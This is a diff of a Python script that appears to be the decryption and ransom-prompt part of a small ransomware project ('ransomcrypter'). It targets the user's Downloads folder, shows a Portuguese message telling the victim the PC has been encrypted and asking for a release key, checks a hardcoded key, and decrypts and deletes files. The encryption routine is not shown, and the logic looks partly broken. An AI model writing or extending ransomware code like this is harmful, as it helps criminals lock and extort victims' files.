@@ -1,3 +1,11 @@
+import os
+import glob
+import time
+import pyaes
+from pathlib import Path
+
+lst_past=["Downloads"]
+
 def descrypt(decrypt_file):
     try:
         for file in glob.glob('*.ransomcrypter'):
@@ -18,11 +26,18 @@ def descrypt(decrypt_file):
     except ValueError as err:
         print('Chave inválida')
 
-if __name__ == '__main__':
-    key = input('Seu PC foi criptografado informe a chave  para liberar os arquivos:')
-    if key == '1ab2c3e4f5g6h7i8':
-        descrypt(key)
-        for del_file in glob.glob('*.ransomcrypter'):
-            os.remove(f'{desktop}\\{del_file}')
-        else:
-            print('Chave de liberação inválida!!!')
+for i in lst_past:
+    try:
+        desktop = Path.home() / i
+        #download = Path.home() / "Downloads"
+    except Exception:
+        pass
+    os.chdir(desktop)
+    if __name__ == '__main__':
+        key = input('Seu PC foi criptografado informe a chave  para liberar os arquivos:')
+        if key == '102efd86a2bec382e7945002e53505a7':
+            descrypt(key)
+            for del_file in glob.glob('*.ransomcrypter'):
+                os.remove(f'{desktop}\\{del_file}')
+            else:
+                print('Chave de liberação inválida!!!')
